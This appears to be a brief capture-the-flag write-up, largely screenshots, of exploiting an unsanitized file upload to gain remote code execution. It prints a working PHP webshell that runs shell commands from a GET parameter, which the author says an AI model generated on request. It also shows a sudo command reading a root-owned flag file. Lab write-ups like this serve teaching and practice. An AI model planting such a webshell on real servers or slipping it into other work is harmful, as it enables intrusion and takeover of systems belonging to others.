![image](https://github.com/user-attachments/assets/4f50e8b9-a702-45f1-8d52-8ad5916663ac)> File upload exploit
> not sanitizing user input causing RCE


![image](https://github.com/user-attachments/assets/1f9d22df-172d-4644-959f-80f14288176d)
 
nice pic bro 

![image](https://github.com/user-attachments/assets/b08a92ef-7f24-4754-b68c-369cc7af8d38)
![image](https://github.com/user-attachments/assets/ee05a9d6-74ec-4687-afeb-b935cf883dfe)

Uploaded and to no surprise, we can see the image in there =)

![image](https://github.com/user-attachments/assets/ab94b8a6-c2a3-43f2-bb8d-36ccf3499a5e)
![image](https://github.com/user-attachments/assets/c66b006a-c662-423d-831d-27ef3baa94bf)

Uploaded, acessible and rendered. 

TIME TO USE CHINA'S LATEST TECHNOLOGY: DEEPSEEK

With a simple webshell it generated, we can start executing commands on their server and navigate the files

```
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
```

![image](https://github.com/user-attachments/assets/dcc13ce5-d8c3-42e6-abce-0324f1d4021d)

```cd ../../../../; sudo cat /root/flag.txt```

By executing this command, we are able to read the flag file in the /root directory, of course, with sudo 

![image](https://github.com/user-attachments/assets/34e69ca6-3686-4c9d-b7bc-0f3802d7a0fe)

![image](https://github.com/user-attachments/assets/a1c909ff-b789-4949-a444-fcc9c0404b8d)

